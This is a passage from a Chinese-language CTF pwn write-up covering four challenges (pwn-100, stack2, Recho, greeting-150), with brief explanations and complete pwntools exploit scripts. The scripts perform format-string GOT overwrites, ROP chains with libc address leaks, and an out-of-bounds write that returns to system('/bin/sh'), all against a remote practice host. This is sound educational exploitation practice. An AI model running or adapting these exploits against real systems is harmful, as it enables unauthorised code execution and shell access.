offset = 12
log.success('offset: %d', offset)

writes = { 0x0804a048: 0x02223322}
payload = fmtstr_payload(offset, writes)
log.success("payload: %s", payload)

sh = remote('220.249.52.133', 57893)
sh.sendline(payload)
sleep(1)
sh.interactive()
```

### 14. pwn-100
题目：无

思路：64位栈溢出，常规rop方法即可，本题使用了万能rop，没有提供libc需要先泄露libc地址。

代码如下：
```python
from pwn import *
from LibcSearcher import *

sh = remote('220.249.52.133', 52332)
elf = ELF('bee9f73f50d2487e911da791273ae5a3')

ppppppr = 0x40075A
mmmcall = 0x400740

# 利用万能gadget封装一个函数指针调用功能
def makePayload(funcAddr, arg0, arg1, arg2):
    # 这一段在echo函数中会被复制到缓冲区中导致栈溢出
    # 后续因为有0字符不会被复制
    payload = b'A' * 64
    payload += b'B' * 8
    ret = ppppppr
    payload += p64(ret)
    rbx = 0
    rbp = 1
    r12 = funcAddr
    r13 = arg2
    r14 = arg1
    r15 = arg0
    ret = mmmcall
    payload += p64(rbx)
    payload += p64(rbp)
    payload += p64(r12)
    payload += p64(r13)
    payload += p64(r14)
    payload += p64(r15)
    payload += p64(ret)
    # mmmcall指令执行完后，还会继续执行到add rsp,8和ppppppr指令
    # 因此首先安排56字节填充内容，然后在放置新的返回地址，这里使用main函数
    ret = 0x4006B8
    payload += b'C' * 56
    payload += p64(ret)
    return payload

# 使用DynELF报错，提示找不到DT_PLTGOT???
# def _leak(addr):
#     payload = makePayload(elf.got['puts'], addr, 1, 1)
#     sh.send(payload.ljust(200, b'a'))
#     data = sh.recvuntil('\n')
#     data = sh.recvuntil('\n').strip() + b'\x00\x00'
#     return data[:1]
# 
# def leak(addr):
#     res = b''
#     for i in range(8):
#         res += _leak(addr + i)
#     print(addr, res)
#     return res
# 
# d = DynELF(leak, elf=elf)
# system = d.lookup('system', 'libc')
# log.info('system: 0x%x', system)


# 使用libcsearcher查找到多个结果，逐个测试就可以了
payload = makePayload(elf.got['puts'], elf.got['puts'], 1, 1)
sh.send(payload.ljust(200, b'a'))
data = sh.recvuntil('\n')
data = sh.recvuntil('\n').strip() + b'\x00\x00'
putsAddr = u64(data)
log.success('puts.got: 0x%x' % putsAddr)

payload = makePayload(elf.got['puts'], elf.got['read'], 1, 1)
sh.send(payload.ljust(200, b'a'))
data = sh.recvuntil('\n')
data = sh.recvuntil('\n').strip() + b'\x00\x00'
readAddr = u64(data)
log.success('read.got: 0x%x' % readAddr)

libc = LibcSearcher('puts', putsAddr)
libc.add_condition('read', readAddr)

libBase = putsAddr - libc.dump('puts')
systemAddr = libBase + libc.dump('system')
binStrAddr = libBase + libc.dump('str_bin_sh')
log.success('libBase: 0x%x' % libBase)
log.success('systemAddr: 0x%x' % systemAddr)
log.success('binStrAddr: 0x%x' % binStrAddr)

bss = elf.bss() + 100
payload = makePayload(elf.got['read'], 0, bss, 16)
sh.send(payload.ljust(200, b'a'))
sleep(1)
data = sh.recvuntil('\n')
sh.send(b'/bin/sh\x00'+p64(systemAddr))
sleep(1)
payload = makePayload(bss + 8, bss, 1, 1)
sh.send(payload.ljust(200, b'a'))
data = sh.recvuntil('\n')
sh.interactive()
```

### 15. stack2
题目：暂无

思路：漏洞点在于数组越界，导致可以写任意地址。

存在两个坑，一个是在覆盖main函数的返回地址时没有注意，直接使用常规栈帧计算，一直没有效果，查看wp发现返回地址不是在ebp之下，而是存在一段距离，仔细查看了汇编代码才发现在push ebp之前还有几条指令。
```asm
.text:080485D0                 lea     ecx, [esp+4]
.text:080485D4                 and     esp, 0FFFFFFF0h
.text:080485D7                 push    dword ptr [ecx-4]
.text:080485DA                 push    ebp
.text:080485DB                 mov     ebp, esp
```
将esp按16字节对齐，因此栈顶会抬高一段距离，具体通过调试可以知道。此后还需要将对齐之前的栈顶压栈，用于恢复。

第二个坑在于返回到hack函数的时候提示没有/bin/bash这个命令。有两个解决办法，第一个是通过```ROPgadget --binary  3fb1a42837be485aae7d85d11fbc457b --string "sh"```查找sh字符串，然后将返回地址和参数覆盖为system.plt和sh的地址，如果不行的话可以通过rop的方式，利用scanf函数手动写入/bin/sh字符串到bss段，然后继续rop调用system("/bin/sh")。

全部代码如下：
```python
from pwn import *

sh = remote("220.249.52.133", 34088)

sh.recvuntil(":\n")
sh.sendline("1")
sh.sendline("1")

def writeByte(index, data):
    sh.recvuntil("exit\n")
    sh.sendline("3")
    sh.sendlineafter(":\n", "%d" % index)
    sh.sendlineafter(":\n", "%d" % data)

systemAddr = 0x08048450
shAddr = 0x08048987
payload = p32(systemAddr) + b'AAAA' + p32(shAddr)
index = 132
print(payload)
for i in payload:
    writeByte(index, i)
    index += 1

data = sh.sendlineafter("exit\n", "5")
print(data)
sh.interactive()
```

### 16. Recho
题目：暂无

思路：看起来是一个很简单的栈溢出，但是难点在于如何使得main函数返回，从而劫持控制流。这里使用了pwntools提供的shutdown功能，可以关闭输入流，但是由于无法继续输入了，因此必须通过rop一次获取flag，而不能继续进入main函数输入其他信息了。

由于只能关闭输入流才能劫持控制流，因此本题不能使用getshell的方式，而是使用了读文件的方式获取flag，并且本题正好提供了一个flag字符串，用于执行open函数。因此最终我们需要构造如下功能的shellcode：
```c
int fd = open("flag", READONLY);
read(fd, buf, 100);
printf(buf);
```
由于本程序已经导入了alarm，read，write，现在还缺少open函数。修改alarm函数got表的内容将其指向alarm函数中调用syscall的部分，然后通过rop控制syscall的相关参数即可手动实现open函数。查看下alarm函数的ida反汇编代码如下：
```c
.text:00000000000C0AC0 alarm           proc near               ; CODE XREF: lckpwdf+1AC↓p
.text:00000000000C0AC0                                         ; lckpwdf+1F3↓p ...
.text:00000000000C0AC0 ; __unwind {
.text:00000000000C0AC0                 mov     eax, 25h ; '%'
.text:00000000000C0AC5                 syscall                 ; LINUX - sys_alarm
.text:00000000000C0AC7                 cmp     rax, 0FFFFFFFFFFFFF001h
.text:00000000000C0ACD                 jnb     short loc_C0AD0
.text:00000000000C0ACF                 retn
```
默认alarm的got表中保存的地址应该是libc基址+00000000000C0AC0，如果将这个地址往后偏移5个字节即可实现手动调用syscall了。不同libc版本偏移不一定都为5个字节，某些版本可能是7个字节或其他。要实现这个功能需要一个包含add指令的Gadget，使用ROPGadget搜索add|ret指令可以得到。
```c
0x000000000040070d : add byte ptr [rdi], al ; ret
```
只要设置al为5，rdi为alarm.got即可实现将alarm.got所指向的内容增加5个字节的偏移。现在梳理下rop调用链：

1. 设置rdi为alarm.got
pop rdi; ret
2. 设置al为5
pop rax; ret
3. 修改got表
add [rdi], al; ret
4. 设置open的两个参数
pop rdi; ret
pop rsi; ret
5. 设置eax为open函数的系统调用号
pop rax; ret
6. 设置read函数的3个参数
pop rdi; ret
pop rsi; ret // 没有这个Gadget，可以用pop rsi; pop r15; ret代替
pop rdx; ret
7. 设置printf函数的参数
pop rdi; ret

最终所需要的Gadget为
```python
0x00000000004006fc : pop rax ; ret
0x00000000004008a3 : pop rdi ; ret
0x00000000004006fe : pop rdx ; ret
0x00000000004008a1 : pop rsi ; pop r15 ; ret
0x000000000040070d : add byte ptr [rdi], al ; ret

pop_rax = 0x4006fc
pop_rdi = 0x4008a3
pop_rdx = 0x4006fe
pop_rsi_r15 = 0x4008a1
add_rdi = 0x40070d
```

全部利用代码如下
```python
from pwn import *

elf = ELF('773a2d87b17749b595ffb937b4d29936')
sh = remote('220.249.52.133', 46624)

data = sh.recvuntil('\n')
log.info(data)

# 覆盖缓冲区
payload = b'A' * 0x38

# gadget地址
pop_rax = 0x4006fc
pop_rdi = 0x4008a3
pop_rdx = 0x4006fe
pop_rsi_r15 = 0x4008a1
add_rdi = 0x40070d

# rop开始
# 1. 修改got表
payload += p64(pop_rdi) + p64(elf.got['alarm']) + p64(pop_rax) +  p64(5) + p64(add_rdi)
# 2. open("flag", READONLY)
# open的系统调用号为2
# 这里最后虽然调用的是alarm函数，但是实际会跳转至syscall
payload += p64(pop_rdi) + p64(next(elf.search(b'flag'))) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(pop_rax) + p64(2) +  p64(elf.plt['alarm'])
# 3. read(3, buf, 100)
# open打开文件默认从3开始
# buf使用bss段数据
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi_r15) + p64(elf.bss() + 100) + p64(0) + p64(pop_rdx) + p64(100) + p64(elf.plt['read'])
# 4. printf(buf)
payload += p64(pop_rdi) + p64(elf.bss() + 100) + p64(elf.plt['printf'])

print(payload)
sh.sendline(str(0x200))
sh.send(payload.ljust(0x200, b'\x00'))
sh.shutdown('write')
sh.interactive()
```

### 17. greeting-150
题目：暂无

思路：格式化字符串漏洞，可以修改got表，这里的关键在于修改_do_global_dtors_aux函数的got表，使得main函数结束后可以劫持流程。

#### __do_global_dtors_aux和__do_global_ctors_aux
静态对象的构造函数和析构函数的地址分别存储在 ELF可执行文件的不同部分中。对于构造函数，有一个名为 .CTORS 的部分，对于析构函数，有 .DTORS 部分。编译器创建两个辅助函数 __ do_global_ctors_aux 和 __ do_global_dtors_aux ，分别用于调用这些静态对象的构造函数和析构函数。__ do_global_ctors_aux 功能只是在 .CTORS 部分执行，而 __ do_global_dtors_aux 仅针对执行相同的工作。 DTORS 部分，其中包含指定析构函数的程序。

#### 修改got
修改__do_global_dtors_aux的got内容为main函数地址使得main函数结束后还可以再次重入到main函数，然后修改strlen函数的got表内容为system函数地址，然后调用strlen("/bin/sh")时就获取了shell。
```python
.fini_array:08049934 __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux
.fini_array:08049934                                         ; DATA XREF: __libc_csu_init+18↑o
.fini_array:08049934 _fini_array     ends                    ; Alternative name is '__init_array_end'
# 0x08049934的内容从080485A0 __do_global_dtors_aux proc near修改为080485ED ; int __cdecl main
# 可以看到只用修改一个字节即可
```

修改strlen的got地址内容为system地址，system地址不便于获取，可以用system的plt地址代替。

全部利用代码如下：
```python
from pwn import *

sh = remote('220.249.52.133', 55994)
data = sh.recvuntil('... ')
print(data)

# 借助ida可以分析调用printf堆栈情况
# 0xA0 --> s
# ...
# 0x84 --> 'Nice'
# 0x80 --> ' to '
# 0x7c --> 'meet'
# 0x78 --> ' you'
# 0x74 --> ', '
# 首先添加两个字符使栈内容按照4字节对齐
payload = b'AA'
# 修改dtor got地址，需要写入的地址, 第12个参数
# 修改前后只有最后一个字节不同，因此只用写入一个字节
payload += p32(0x08049934)
# 由于之前已经输出了24个字符，还需要输出0xed-24个字符
payload += b'%213'
payload += b'c%12'
payload += b'$hhn'
# 没有system函数的地址，但是可以使用plt的地址
strlenGot = 0x08049A54
# systemPlt = 0x08048490
# 分两次写入
# 修改strlen got地址, 先写高地址，第16个参数
payload += p32(strlenGot + 2)
payload += b'%181'
payload += b'1c%1'
payload += b'6$hn'
# 写低地址, 第20个参数
payload += p32(strlenGot)
payload += b'%318'
payload += b'80c%'
payload += b'20$h'
payload += b'n'
print(payload)
print(len(payload))

# 上面生成payload的方式计算比较复杂
# 可以将地址写在前面，方便计算
# 按照数字从小到大的顺序写入
payload = b'AA'
payload += flat([0x08049934, strlenGot + 2, strlenGot])
chars = [0xed - 32, 0x804 - 0xed, 0x8490 - 0x804]
payload += ('%' + str(chars[0]) + 'c%12$hhn%' + str(chars[1]) + 'c%13$hn%' + str(chars[2]) + 'c%14$hn').encode('utf8')
print(payload)
sh.sendline(payload)

data = sh.recvuntil('... ')
sh.sendline('/bin/sh')
sh.interactive()
```